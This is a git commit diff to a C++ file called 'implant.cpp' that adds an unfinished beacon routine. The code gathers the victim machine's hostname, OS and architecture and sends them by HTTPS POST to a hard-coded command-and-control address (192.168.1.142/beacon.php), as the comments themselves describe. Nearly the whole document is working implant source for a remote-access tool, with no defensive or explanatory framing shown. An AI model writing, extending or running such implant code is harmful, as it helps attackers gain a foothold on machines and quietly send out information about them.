c9bdf556b4f110af165d604ed60d5aef71fe3675
Hunter Hardman <t3ntman@gmail.com>
2016-06-06 23:05:35 -0600

    Added in some beacon functionality - Not finished

--- Client/implant.cpp
+++ Client/implant.cpp
@@ -1,17 +1,25 @@
 #include <iostream>
 #include <string>
+#include "stdafx.h"				// WinHttpClient
+#include "WinHttpClient.h"		// WinHttpClient
+
 
 // Function prototypes
+wstring beacon(wstring beaconURL);
 wstring getHostname();
 wstring getOS();
 wstring getArchitecture();
 
+
 // Start of main() function
 int main()
 {
+	wstring beaconURL = L"https://192.168.1.142/beacon.php";
+
 	wcout << getHostname() << endl;
 	wcout << getOS() << endl;
 	wcout << getArchitecture() << endl;
+	beacon(beaconURL);
 	
 	return 0;
 }
@@ -69,3 +77,49 @@ wstring getArchitecture()
 	return architecture; // Retruns the "architecture" wstring to the calling function
 }
 // End of getArchitecture() function
+
+
+// Obtained from http://stackoverflow.com/questions/36774547/httpsendrequest-post-data-not-supporting-unicode
+// Used to convert POST data from UTF-16 (wstring) to UTF-8 (string)
+// Returns UTF-8 "out" string
+string UTF8Encode(const wstring &wstr)
+{
+	string out = "";
+	int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), NULL, 0, NULL, NULL);
+	if (len > 0)
+	{
+		out.resize(len);
+		WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), wstr.length(), &out[0], len, NULL, NULL);
+	}
+	return out; // Returns UTF-8 string to the calling function
+}
+// End of UTF8Encode() function
+
+
+// Beacons over HTTPS to the specified C2 server
+// Returns "response" wstring
+wstring beacon(wstring beaconURL)
+{
+	WinHttpClient beacon(beaconURL);
+
+	beacon.SetProxy(L"127.0.0.1:9999");	// DEBUGGING - REMOVE LATER
+
+	// ** NEED TO ADD IN URL ENCODING FOR THE POST PARAMETERS BELOW **
+
+	string data = "hostname=" + UTF8Encode(getHostname()) + "&os=" + UTF8Encode(getOS()) + "&architecture=" + UTF8Encode(getArchitecture()); // POST data
+	beacon.SetAdditionalDataToSend((BYTE *)data.c_str(), data.size());
+
+	wstring contentLength = to_wstring(data.length()); // We need to create new wstring for the Content-Length so we can append to the other headers
+
+	wstring headers = L"Content-Length: ";
+	headers += contentLength;
+	headers += L"\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
+	beacon.SetAdditionalRequestHeaders(headers); // Appends headers above
+
+	beacon.SendHttpRequest(L"POST"); // Sends the POST request
+
+	wstring response = beacon.GetResponseContent(); // Gets POST respone and stores in "response" wstring
+
+	return response;
+}
+// End of beacon() function
